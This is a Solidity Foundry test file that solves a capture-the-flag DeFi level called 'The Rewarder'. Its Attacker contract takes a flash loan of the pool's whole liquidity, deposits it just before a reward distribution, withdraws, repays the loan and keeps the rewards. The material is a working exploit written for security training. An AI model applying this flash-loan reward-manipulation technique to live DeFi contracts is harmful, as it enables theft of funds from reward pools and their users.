// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/the-rewarder/TheRewarderLevel.sol";
import "@openzeppelin/contracts//token/ERC20/IERC20.sol";

interface IRewarderPool {
  function distributeRewards() external returns (uint256);
  function deposit(uint256 amount) external;
  function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
  function flashLoan(uint256) external;
}

contract Attacker {
  TheRewarderLevel level;
  IERC20 liquidityToken;
  IERC20 rewardToken;
  IRewarderPool rewarderPool;
  IFlashLoanerPool flashLoanPool;

  constructor(TheRewarderLevel _level) {
    level = _level;
    liquidityToken = IERC20(address(level.liquidityToken()));
    rewardToken = IERC20(address(level.rewardToken()));
    rewarderPool = IRewarderPool(address(level.rewarderPool()));
    flashLoanPool = IFlashLoanerPool(address(level.flashLoanPool()));
  }

  function attack() public {
    // borrow all the DVT you can get
    // the flow continues at receiveFlashLoan()
    flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));

    // give the reward to the player, to beat the level
    rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
  }

  function receiveFlashLoan(uint256 amount) public {
    // deposit the DVT into the rewarderPool
    liquidityToken.approve(address(rewarderPool), amount);
    rewarderPool.deposit(amount);

    // trigger this to get rewards, and increment the round number
    rewarderPool.distributeRewards();

    // got the rewards, get the DVT back
    rewarderPool.withdraw(amount);

    // pay back the flash loan
    liquidityToken.transfer(msg.sender, amount);
  }
}

contract TheRewarderTest is Test {
  TheRewarderLevel level = new TheRewarderLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    // advance time 5 days
    vm.warp(block.timestamp + 5 days);

    Attacker attacker = new Attacker(level);
    attacker.attack();

    level.validate();
  }
}
